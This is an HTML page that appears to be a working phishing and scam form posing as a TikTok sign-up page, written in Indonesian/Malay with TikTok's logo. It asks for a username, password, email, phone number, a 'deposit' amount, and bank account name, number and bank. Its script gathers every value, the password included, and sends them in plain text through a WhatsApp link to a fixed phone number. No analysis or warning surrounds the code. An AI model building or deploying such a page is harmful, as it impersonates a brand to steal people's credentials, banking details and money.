<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Pendaftaran | TikTok</title>
    <link rel="icon" href="https://cdn.pixabay.com/photo/2021/06/15/12/28/tiktok-6338429_640.png" type="image/x-icon">
    <style>
        /* CSS styles remain the same */
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/id/thumb/a/a9/TikTok_logo.svg/2560px-TikTok_logo.svg.png" alt="TikTok Logo">
        </div>
        <a href="#" class="help-link">Maklum Balas dan Bantuan</a>
    </div>

    <div class="container">
        <h1>Daftar untuk TikTok</h1>
        <div class="signup-options">
            <form id="signup-form" class="signup-options">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Masukkan Username">

                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Masukkan Password">

                <label for="name">Name</label>
                <input type="text" id="name" name="name" placeholder="Masukkan Nama Lengkap">

                <label for="email">E-mail</label>
                <input type="email" id="email" name="email" placeholder="Masukkan Alamat E-mail">

                <label for="deposit">Deposit</label>
                <input type="number" id="deposit" name="deposit" placeholder="Masukkan Jumlah Deposit">

                <label for="mobile">Mobile Phone Number</label>
                <input type="tel" id="mobile" name="mobile" placeholder="Masukkan Nomor HP">

                <label for="account-name">Nama Akaun</label>
                <input type="text" id="account-name" name="account-name" placeholder="Masukkan Nama Akaun">

                <label for="account-number">Nombor Akaun</label>
                <input type="text" id="account-number" name="account-number" placeholder="Masukkan Nombor Akaun">

                <label for="bank-name">Nama Bank</label>
                <input type="text" id="bank-name" name="bank-name" placeholder="Masukkan Nama Bank">

                <button type="button" id="submit-btn">Kirim ke WhatsApp</button>
            </form>
        </div>

        <div class="footer-text">
            Dengan menggunakan akaun yang terletak di <strong>Indonesia</strong>, anda bersetuju menerima 
            <a href="#">Syarat Perkhidmatan</a> kami dan mengakui bahawa anda telah membaca 
            <a href="#">Dasar Privasi</a> kami.
        </div>

        <div class="login-link">
            Sudah mempunyai akaun? <a href="#">Masuk</a>
        </div>
    </div>

    <script>
        document.getElementById('submit-btn').addEventListener('click', function () {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const deposit = document.getElementById('deposit').value;
            const mobile = document.getElementById('mobile').value;
            const accountName = document.getElementById('account-name').value;
            const accountNumber = document.getElementById('account-number').value;
            const bankName = document.getElementById('bank-name').value;

            const message = `Halo, saya ingin mendaftar dengan data berikut:%0A` +
                `Username: ${username}%0A` +
                `Password: ${password}%0A` +
                `Nama Lengkap: ${name}%0A` +
                `Email: ${email}%0A` +
                `Deposit: ${deposit}%0A` +
                `Nomor HP: ${mobile}%0A` +
                `Nama Akun: ${accountName}%0A` +
                `Nomor Akun: ${accountNumber}%0A` +
                `Nama Bank: ${bankName}`;

            const whatsappUrl = `https://wa.me/628123456789?text=${message}`;
            window.open(whatsappUrl, '_blank');
        });
    </script>
</body>
</html>
